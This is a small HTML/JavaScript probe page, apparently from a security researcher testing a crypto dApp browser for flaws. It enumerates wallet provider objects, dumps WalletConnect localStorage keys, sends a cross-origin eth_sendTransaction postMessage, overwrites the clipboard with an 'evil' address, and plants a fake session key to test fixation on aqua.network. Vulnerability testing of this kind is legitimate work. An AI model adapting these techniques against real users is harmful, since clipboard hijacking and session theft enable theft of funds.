<script>
function log(t){ document.getElementById('log').innerText += t+'\n'; }
function dump(){
  log('--- Provider Dump ---');
  ['ethereum','phantom','trust','trustwallet','okxwallet','rabby','coinbaseWalletExtension','freighter','stellar'].forEach(k=>{
    if(window[k]) log(k+' FOUND: keys='+Object.keys(window[k]).join(',').substring(0,300));
    else log(k+' not found');
  });
  log('--- WC Storage ---');
  for(let i=0;i<localStorage.length;i++){ let k=localStorage.key(i); if(k.toLowerCase().includes('wc')) log('LS WC: '+k+'='+localStorage.getItem(k).substring(0,100)); }
}
function testPostMessage(){
  log('Sending postMessage to * with eth_sendTransaction...');
  window.postMessage({method:'eth_sendTransaction', params:[{to:'0x0000000000000000000000000000000000000000'}]}, '*');
  log('If wallet popup appears without checking origin = CRITICAL');
}
function testClip(){
  log('Trying clipboard write...');
  navigator.clipboard.writeText('0xEVIL_ADDRESS_0x403for').then(()=>log('Clipboard overwritten - if no user gesture prompt = HIGH')).catch(e=>log('Clipboard blocked: '+e.message+' = SECURE'));
}
function testWC(){
  const evilKey = 'wc:evil-session-0x403for';
  localStorage.setItem(evilKey, JSON.stringify({test:true}));
  log('Set '+evilKey+' - now open aqua.network in new tab inside same dApp browser');
  log('If aqua.network can read '+evilKey+' = WC Fixation CRITICAL');
  window.open('https://aqua.network','_blank');
}
